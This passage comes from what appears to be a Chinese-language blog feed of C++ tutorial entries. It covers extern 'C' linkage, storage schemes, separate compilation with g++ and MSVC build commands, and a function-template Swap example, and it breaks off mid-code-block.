程序有时需要调用用其他语言（主要是 C 语言）编写的函数。由于 C++ 支持函数重载（通过名称修饰），而 C 语言不支持，直接链接可能会失败。<strong>语言链接性 (Language Linkage)</strong> 机制允许指定函数应遵循哪种语言的链接约定。</p><p>最常用的是 <code>extern &quot;C&quot;</code>，它指示编译器使用 C 语言的链接约定（通常只是函数名本身，没有修饰）。</p><p><strong>用法:</strong></p><ul><li><strong>单个函数:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">c_style_function</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li><strong>多个函数块:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; // 包含 C 头文件</span></span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">c_function1</span><span class="params">(<span class="keyword">double</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">c_function2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>当在 C++ 代码中包含 C 语言的头文件时，这些头文件通常已经使用了 <code>extern &quot;C&quot;</code>（通过条件编译 <code>__cplusplus</code> 宏）来确保 C++ 编译器能正确链接其中的函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C 头文件 my_c_lib.h 可能包含类似结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">c_api_call</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="comment">// ... 其他 C 函数声明 ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125; <span class="comment">// extern &quot;C&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="9-2-10-存储方案和动态分配"><a href="#9-2-10-存储方案和动态分配" class="headerlink" title="9.2.10 存储方案和动态分配"></a>9.2.10 存储方案和动态分配</h2><p>总结一下主要的存储方案：</p><ol><li> <strong>自动存储:</strong> 栈内存，生命周期与代码块绑定，自动管理。</li><li> <strong>静态存储:</strong> 程序生命周期内存在，根据链接性（外部、内部、无）决定可见性。</li><li> <strong>线程存储:</strong> 生命周期与线程绑定。</li><li> <strong>动态存储:</strong> 堆内存（自由存储区），生命周期由 <code>new</code> 和 <code>delete</code> 手动管理。</li></ol><p>动态分配 (<code>new</code>/<code>delete</code>) 提供了最大的灵活性，允许在运行时根据需要创建和销毁对象，但同时也带来了手动管理内存的责任，容易出错（如内存泄漏、悬挂指针）。后续章节将更详细地探讨动态内存管理，特别是与类结合使用时。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.1 单独编译</title>
      <link href="2025/04/26/9.1_%E5%8D%95%E7%8B%AC%E7%BC%96%E8%AF%91/"/>
      <url>2025/04/26/9.1_%E5%8D%95%E7%8B%AC%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<p>随着程序变得越来越大，将所有代码都放在一个巨大的 <code>main.cpp</code> 文件中会变得难以管理和维护。C++ 支持**单独编译 (Separate Compilation)**，允许我们将程序分解成多个独立的源文件（通常是 <code>.cpp</code> 文件）和头文件（通常是 <code>.h</code> 或 <code>.hpp</code> 文件）。</p><p><strong>这样做的好处:</strong></p><ol><li> <strong>组织性:</strong> 将相关的函数、类等放在不同的文件中，使项目结构更清晰。</li><li> <strong>可重用性:</strong> 可以将通用的功能（如工具函数、类定义）放在单独的文件中，方便在其他项目中重用。</li><li> <strong>模块化:</strong> 每个文件可以专注于特定的功能模块。</li><li> <strong>编译效率:</strong> 当修改某个 <code>.cpp</code> 文件时，通常只需要重新编译该文件，然后与其他未改变的目标文件重新链接即可，无需重新编译整个项目，大大节省了编译时间。</li></ol><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>单独编译通常涉及两种主要的文件类型：</p><ol><li><p><strong>头文件 (<code>.h</code> 或 <code>.hpp</code>)</strong>:</p><ul><li>  <strong>目的:</strong> 包含**声明 (Declarations)**，告诉编译器某个函数、类或变量的“接口”是什么样的，但不包含具体的实现代码（除了模板和内联函数）。</li><li><strong>典型内容:</strong><ul><li>  函数原型（函数声明）</li><li>  类 (class) 定义</li><li>  结构 (struct) 定义</li><li>  枚举 (enum) 定义</li><li>  模板 (template) 定义</li><li>  内联函数 (inline) 定义</li><li>  <code>const</code> 常量定义</li><li>  <code>using</code> 声明或指令</li></ul></li><li>  <strong><code>#include</code> 指令:</strong> 源文件通过 <code>#include &quot;header_file.h&quot;</code> 指令将头文件的内容包含进来，以便编译器知道如何使用其中声明的函数或类。</li><li><strong>包含卫哨 (Include Guards):</strong> 为了防止同一个头文件被意外地多次包含到同一个源文件中（这可能导致重定义错误），头文件通常使用<strong>包含卫哨</strong>。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myheader.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYHEADER_H_ <span class="comment">// 如果 MYHEADER_H_ 还没有被定义过</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYHEADER_H_ <span class="comment">// 就定义 MYHEADER_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 头文件的实际内容放在这里...</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_function</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYHEADER_H_</span></span></span><br></pre></td></tr></table></figure>  或者使用 C++ 特有的 <code>#pragma once</code> 指令（更简洁，但不是所有编译器都支持，尽管非常普遍）：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myheader.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 头文件的实际内容放在这里...</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_function</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>源文件 (<code>.cpp</code>)</strong>:</p><ul><li>  <strong>目的:</strong> 包含**定义 (Definitions)**，即函数或方法的具体实现代码，以及全局变量的定义和初始化。</li><li><strong>典型内容:</strong><ul><li>  函数体（实现）</li><li>  类成员函数的实现</li><li>  全局变量的定义和初始化</li><li>  <code>main</code> 函数（通常在一个单独的 <code>.cpp</code> 文件中）</li></ul></li><li>  <strong>编译:</strong> 每个 <code>.cpp</code> 文件通常会被编译器<strong>独立地</strong>编译成一个**目标文件 (Object File)**（通常是 <code>.obj</code> 或 <code>.o</code> 文件）。目标文件包含了该源文件对应的机器代码，但可能还包含对其他文件中定义的函数或变量的引用。</li></ul></li></ol><h2 id="编译和链接过程"><a href="#编译和链接过程" class="headerlink" title="编译和链接过程"></a>编译和链接过程</h2><p>在C++中，将源代码转换为可执行程序通常分为编译和链接两个主要阶段。让我们看看这些过程中涉及的具体命令：</p><h3 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h3><p>使用g++（GNU C++ 编译器）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译单个源文件</span></span><br><span class="line">g++ -c utils.cpp     <span class="comment"># 生成 utils.o 目标文件</span></span><br><span class="line">g++ -c main.cpp      <span class="comment"># 生成 main.o 目标文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加优化选项</span></span><br><span class="line">g++ -c -O2 utils.cpp <span class="comment"># 使用O2级别的优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加调试信息</span></span><br><span class="line">g++ -c -g utils.cpp  <span class="comment"># 包含调试信息</span></span><br></pre></td></tr></table></figure><p>使用MSVC（Microsoft Visual C++）:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译单个源文件</span></span><br><span class="line">cl /c utils.cpp      <span class="comment"># 生成 utils.obj 目标文件</span></span><br><span class="line">cl /c main.cpp       <span class="comment"># 生成 main.obj 目标文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加优化选项</span></span><br><span class="line">cl /c /O2 utils.cpp  <span class="comment"># 使用O2级别的优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加调试信息</span></span><br><span class="line">cl /c /Zi utils.cpp  <span class="comment"># 包含调试信息</span></span><br></pre></td></tr></table></figure><h3 id="链接命令"><a href="#链接命令" class="headerlink" title="链接命令"></a>链接命令</h3><p>使用g++:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 链接目标文件生成可执行文件</span></span><br><span class="line">g++ main.o utils.o -o myprogram</span><br><span class="line"></span><br><span class="line"><span class="comment"># 链接并指定库文件</span></span><br><span class="line">g++ main.o utils.o -lmath -o myprogram</span><br></pre></td></tr></table></figure><p>使用MSVC:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 链接目标文件生成可执行文件</span></span><br><span class="line">link main.obj utils.obj /OUT:myprogram.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 链接并指定库文件</span></span><br><span class="line">link main.obj utils.obj math.lib /OUT:myprogram.exe</span><br></pre></td></tr></table></figure><h3 id="一步完成编译和链接"><a href="#一步完成编译和链接" class="headerlink" title="一步完成编译和链接"></a>一步完成编译和链接</h3><p>通常，我们可以在一个命令中完成编译和链接:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用g++</span></span><br><span class="line">g++ main.cpp utils.cpp -o myprogram</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用MSVC</span></span><br><span class="line">cl main.cpp utils.cpp /Fe:myprogram.exe</span><br></pre></td></tr></table></figure><p>编译器会自动处理中间步骤，生成必要的目标文件，然后链接它们创建最终的可执行文件。</p><p>一个包含多个文件的 C++ 项目的典型构建过程如下：</p><ol><li><strong>编译 (Compilation):</strong> 编译器分别处理每个 <code>.cpp</code> 源文件。对于每个 <code>.cpp</code> 文件：<ul><li>  预处理器处理 <code>#include</code> 指令，将头文件的内容插入到源文件中。</li><li>  编译器将处理后的源代码翻译成机器码，生成一个目标文件 (<code>.obj</code> 或 <code>.o</code>)。</li></ul></li><li><strong>链接 (Linking):</strong> <strong>链接器 (Linker)</strong> 将所有由编译器生成的目标文件以及可能需要的库文件（包含预编译代码，如标准库）组合在一起。<ul><li>  链接器负责解析目标文件之间的交叉引用（例如，<code>main.cpp</code> 调用了在 <code>utils.cpp</code> 中定义的函数）。</li><li>  如果所有引用都能找到对应的定义，并且没有重定义等错误，链接器就会生成最终的可执行文件（如 <code>.exe</code> 文件）。</li></ul></li></ol><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>假设我们创建一个简单的项目，包含一个计算功能的工具函数。</p><p><strong>1. 头文件 (<code>utils.h</code>)</strong></p><p>包含函数声明和包含卫哨。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\utils.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UTILS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UTILS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型 (声明)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// UTILS_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>2. 源文件 (<code>utils.cpp</code>)</strong></p><p>包含函数的具体实现。它需要包含自己的头文件以确保声明和定义匹配。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\utils.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;utils.h&quot;</span> <span class="comment">// 包含头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义 (实现)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3. 主程序文件 (<code>main.cpp</code>)</strong></p><p>使用 <code>utils.h</code> 中声明的函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;utils.h&quot;</span> <span class="comment">// 包含头文件以使用 add 函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> y = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = add(x, y); <span class="comment">// 调用在 utils.cpp 中定义的函数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The sum of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>构建过程:</strong></p><ol><li> <strong>编译 <code>utils.cpp</code>:</strong> <code>compiler utils.cpp -&gt; utils.obj</code></li><li> <strong>编译 <code>main.cpp</code>:</strong> <code>compiler main.cpp -&gt; main.obj</code></li><li> <strong>链接:</strong> <code>linker main.obj utils.obj -&gt; myprogram.exe</code> (或类似名称)</li></ol><p><strong>声明 vs. 定义:</strong></p><p>理解声明和定义的区别对于单独编译至关重要：</p><ul><li>  <strong>声明 (Declaration):</strong> 告诉编译器某个东西（函数、变量、类等）的存在及其接口（名称、类型、参数等）。一个声明可以出现多次（只要它们一致）。头文件主要包含声明。</li><li>  <strong>定义 (Definition):</strong> 提供了某个东西的具体实现或内存分配。对于非内联函数和非静态数据成员，<strong>一个定义在一个程序中只能出现一次</strong>（<strong>单一定义规则 - One Definition Rule, ODR</strong>）。源文件主要包含定义。</li></ul><p>头文件充当了不同源文件之间的“契约”，确保它们对共享的函数和类有共同的理解，而链接器则负责将这些部分最终组装在一起。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.6 总结</title>
      <link href="2025/04/26/8.6_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/8.6_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章深入探讨了 C++ 函数的更多高级特性，旨在提高代码的效率、灵活性和可重用性。</p><p>主要内容回顾：</p><ol><li><p><strong>内联函数 (<code>inline</code>)</strong>:</p><ul><li>  一种优化建议，请求编译器将函数代码直接替换到调用点，以减少小型、频繁调用函数的调用开销。</li><li>  <code>inline</code> 只是建议，编译器可自行决定是否采纳。</li><li>  通常将内联函数定义放在头文件中。</li><li>  相比宏，内联函数具有类型安全、行为可预测等优点。</li></ul></li><li><p><strong>引用变量 (<code>&amp;</code>)</strong>:</p><ul><li>  变量的别名，声明时必须初始化，之后不能再引用其他变量。</li><li>  <strong>按引用传递</strong> (<code>type&amp;</code>)：函数参数成为原始实参的别名，允许函数修改原始数据，且避免了大型对象的复制开销。</li><li>  <strong>按常量引用传递</strong> (<code>const type&amp;</code>)：函数参数成为原始实参的常量别名，不能通过引用修改原始数据，但同样避免了复制开销。这是传递大型对象进行只读访问的推荐方式。</li><li>  引用比指针在语法上更简洁，且通常不涉及空值问题。</li></ul></li><li><p><strong>默认参数</strong>:</p><ul><li>  允许在函数声明（原型）中为参数指定默认值。</li><li>  调用函数时，如果省略了带有默认值的参数，则使用默认值。</li><li>  默认参数必须从参数列表的最右边开始指定。</li><li>  简化了函数调用，提高了函数的灵活性。</li></ul></li><li><p><strong>函数重载</strong>:</p><ul><li>  允许在同一作用域内定义多个同名函数，只要它们的<strong>参数列表</strong>（数量、类型、顺序）不同。</li><li>  编译器根据调用时的实参来选择匹配的重载版本。</li><li>  返回类型<strong>不能</strong>作为区分重载函数的依据。</li><li>  适用于执行概念上相似但处理不同参数的任务。</li></ul></li><li><p><strong>函数模板 (<code>template &lt;typename T&gt;</code>)</strong>:</p><ul><li>  创建通用的、与类型无关的函数定义。</li><li>  编译器根据调用时使用的具体类型<strong>实例化</strong>相应的函数版本。</li><li>  <strong>重载模板</strong>: 可以定义多个同名模板，只要它们的参数列表或模板参数列表不同。</li><li>  <strong>显式具体化 (<code>template &lt;&gt;</code>)</strong>: 为特定类型提供专门的、非模板的实现，以覆盖通用模板的行为。</li><li>  模板是 C++ 泛型编程的基础，极大地提高了代码的可重用性。</li></ul></li></ol><p>通过掌握这些高级函数特性，可以编写出更高效、更灵活、更易于维护的 C++ 代码。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.5 函数模板</title>
      <link href="2025/04/26/8.5_%E5%87%BD%E6%95%B0%E6%A8%A1%E6%9D%BF/"/>
      <url>2025/04/26/8.5_%E5%87%BD%E6%95%B0%E6%A8%A1%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p>函数重载允许我们为不同的参数类型定义同名函数，但如果这些函数的逻辑完全相同，只是处理的数据类型不同，为每种类型都写一个重载版本会很繁琐且容易出错。例如，交换两个 <code>int</code> 和交换两个 <code>double</code> 的逻辑是一样的。</p><p><strong>函数模板 (Function Template)</strong> 提供了一种更通用的解决方案。它允许我们编写一个<strong>与类型无关</strong>的函数定义，其中的数据类型使用<strong>模板参数</strong>（也叫类型参数）来表示。编译器会根据函数调用时使用的具体数据类型，自动生成（实例化）相应的函数版本。</p><p><strong>目的:</strong></p><ul><li>  编写通用的、可重用的代码，适用于多种数据类型。</li><li>  减少代码重复。</li><li>  提高代码的可维护性。</li></ul><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// 或者 template &lt;class T&gt;</span></span><br><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(parameter_list)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体，可以使用类型参数 T</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;typename T&gt;</code>: 这是模板声明，告诉编译器接下来是一个模板定义。<code>typename</code> 是关键字（也可以用 <code>class</code> 关键字代替，两者在这里等价），<code>T</code> 是模板参数的名称（通常用大写字母，如 <code>T</code>, <code>U</code>, <code>V</code>，但可以是任何合法标识符）。你可以定义多个模板参数，用逗号分隔，例如 <code>template &lt;typename T, typename U&gt;</code>。</li><li>  <code>return_type</code>, <code>parameter_list</code>, <code>function_name</code>: 与普通函数定义类似，但可以在这些部分使用模板参数 <code>T</code> 来代表某种待定的数据类型。</li></ul><p><strong>示例：通用的交换函数模板</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数模板 Swap</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">// T 代表任意类型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123; <span class="comment">// 参数是类型 T 的引用</span></span><br><span class="line">    T temp; <span class="comment">// 声明一个类型为 T 的临时变量</span></span><br><span class="line">    temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original ints: i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// 编译器自动生成 Swap&lt;int&gt;(int&amp;, int&amp;) 版本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped ints: i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j = &quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> x = <span class="number">1.5</span>, y = <span class="number">2.8</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal doubles: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(x, y); <span class="comment">// 编译器自动生成 Swap&lt;double&gt;(double&amp;, double&amp;) 版本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped doubles: x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> c1 = <span class="string">&#x27;A&#x27;</span>, c2 = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal chars: c1 = &quot;</span> &lt;&lt; c1 &lt;&lt; <span class="string">&quot;, c2 = &quot;</span> &lt;&lt; c2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    Swap(c1, c2); <span class="comment">// 编译器自动生成 Swap&lt;char&gt;(char&amp;, char&amp;) 版本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Swapped chars: c1 = &quot;</span> &lt;&lt; c1 &lt;&lt; <span class="string">&quot;, c2 = &quot;</span> &lt;&lt; c2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Swap(i, x); // 错误！编译器无法推断出唯一的 T 类型 (int vs double)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 我们定义了一个名为 <code>Swap</code> 的函数模板，它使用类型参数 <code>T</code>。</li><li> 在 <code>main</code> 函数中，当我们调用 <code>Swap(i, j)</code> 时，编译器看到两个实参都是 <code>int</code> 类型，于是它推断出 <code>T</code> 应该是 <code>int</code>，并自动生成（实例化）一个专门处理 <code>int</code> 的 <code>Swap</code> 函数版本：<code>void Swap&lt;int&gt;(int&amp; a, int&amp; b)</code>。</li><li> 类似地，调用 <code>Swap(x, y)</code> 时，编译器生成 <code>Swap&lt;double&gt;</code> 版本；调用 <code>Swap(c1, c2)</code> 时，生成 <code>Swap&lt;char&gt;</code> 版本。</li><li> 这个过程称为**模板实例化 (Template Instantiation)**。编译器只为程序中实际用到的类型生成函数实例。</li></ol><h2 id="8-5-1-重载的模板"><a href="#8-5-1-重载的模板" class="headerlink" title="8.5.1 重载的模板"></a>8.5.1 重载的模板</h2><p>函数模板也可以像普通函数一样被<strong>重载</strong>。你可以提供多个同名的函数模板，只要它们的模板参数列表不同，或者函数参数列表（非模板参数部分）不同即可。</p><p><strong>示例：重载模板以处理不同数量的参数或特定类型</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 